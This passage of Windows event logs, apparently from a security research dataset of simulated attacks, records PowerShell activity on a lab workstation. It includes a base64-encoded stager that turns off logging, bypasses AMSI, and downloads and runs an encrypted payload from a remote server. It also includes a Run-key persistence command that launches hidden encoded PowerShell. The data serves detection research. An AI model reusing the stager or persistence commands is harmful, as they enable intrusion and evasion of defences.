SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11331\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:19:05.132Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8749}
{"Task":12801,"EventReceivedTime":"2020-07-22 00:19:05","Opcode":"Info","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1104","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"ObjectServer":"Security","tags":["mordorDataset"],"SubjectUserName":"pgustavo","SourceName":"Microsoft-Windows-Security-Auditing","ProcessId":"0x2374","HandleId":"0x3fd4","Channel":"Security","SourceModuleName":"eventlog","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x24579A8\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x3fd4\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x2374\r\n\tProcess Name:\t\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Registry","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:19:05.132Z","Hostname":"WORKSTATION5.mordor.local","SubjectLogonId":"0x24579a8","host":"wec.internal.cloudapp.net","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":4658,"ThreadID":3276,"RecordNumber":258662}
{"Task":13,"EventReceivedTime":"2020-07-22 00:19:05","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-07-22 04:19:04.118\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\r\nDetails: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x\"","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:19:04.118","@timestamp":"2020-07-22T04:19:05.132Z","Details":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x\"","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"SetValue","EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":13,"ThreadID":6244,"RecordNumber":1782146}
{"Task":12,"EventReceivedTime":"2020-07-22 00:19:05","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-07-22 04:19:04.134\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:19:04.134","@timestamp":"2020-07-22T04:19:05.133Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"CreateKey","EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":12,"ThreadID":6244,"RecordNumber":1782147}
{"EventReceivedTime":"2020-07-22 00:19:05","port":55069,"PrivilegeList":"-","SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1104","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"ObjectServer":"Security","ProcessId":"0x2374","Channel":"Security","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x24579A8\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n\tHandle ID:\t\t0x1184\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x2374\r\n\tProcess Name:\t\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0","Category":"Registry","@timestamp":"2020-07-22T04:19:05.133Z","SubjectLogonId":"0x24579a8","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ResourceAttributes":"-","RestrictedSidCount":"0","ThreadID":3276,"Task":12801,"RecordNumber":258663,"Opcode":"Info","TransactionId":"{00000000-0000-0000-0000-000000000000}","@version":"1","SourceModuleType":"im_msvistalog","AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"pgustavo","SourceName":"Microsoft-Windows-Security-Auditing","HandleId":"0x1184","AccessMask":"0x20019","SourceModuleName":"eventlog","ObjectType":"Key","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","SubjectDomainName":"MORDOR","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":4656}
